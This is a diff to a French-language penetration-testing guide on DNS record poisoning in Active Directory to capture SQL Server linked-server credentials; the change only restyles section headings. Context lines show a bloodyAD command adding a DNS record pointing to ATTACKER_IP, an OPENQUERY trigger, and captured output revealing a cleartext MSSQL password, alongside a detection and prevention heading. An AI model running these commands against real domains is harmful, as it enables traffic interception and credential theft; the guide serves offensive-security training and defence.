@@ -13,7 +13,7 @@
 * Utile pour intercepter des connexions SQL Server Linked Server
 * Peut bypasser certaines restrictions réseau
 
-#### Fonctionnement Technique
+#### <mark style="color:green;">Fonctionnement Technique</mark>
 
 ```
 ┌─────────────────┐         DNS Query          ┌──────────────┐
@@ -31,7 +31,7 @@
 └─────────────────┘
 ```
 
-#### Outils Utilisés
+#### <mark style="color:green;">Outils Utilisés</mark>
 
 **1. dnstool.py (Krbrelayx)**
 
@@ -64,7 +64,7 @@ bloodyAD -d DOMAIN -u USER -p 'PASS' --host DC_IP \
   add dnsRecord HOSTNAME ATTACKER_IP
 ```
 
-#### Exploitation Étape par Étape
+#### <mark style="color:green;">Exploitation Étape par Étape</mark>
 
 **Étape 1 : Identifier la cible DNS**
 
@@ -111,7 +111,7 @@ SELECT * FROM OPENQUERY([SQL07], 'SELECT 1');
 [MSSQL] Cleartext Password : bIhBbzMMnB82yx
 ```
 
-#### Détection et Prévention
+#### <mark style="color:green;">Détection et Prévention</mark>
 
 **Détection**
 
